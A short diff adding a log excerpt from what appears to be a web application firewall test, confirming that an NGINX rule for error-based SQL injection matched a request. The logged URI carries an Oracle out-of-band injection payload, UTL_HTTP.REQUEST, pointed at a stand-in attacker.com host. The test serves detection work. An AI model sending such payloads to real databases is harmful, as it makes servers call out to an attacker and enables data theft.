@@ -1,0 +1,3 @@
+Expected Rule: [NGINX SQLi] Error-based SQL Injection
+Matched Rule: [NGINX SQLi] Error-based SQL Injection test_id=SQLI_OOB_005-1772192209714-r8hh3i pattern_id=SQLI_OOB_005 uri=/?q=UTL_HTTP.REQUEST%28%27http%3A%2F%2Fattacker.com%27%29 client=127.0.0.1 method=GET
+Rule Match: ✅ Match
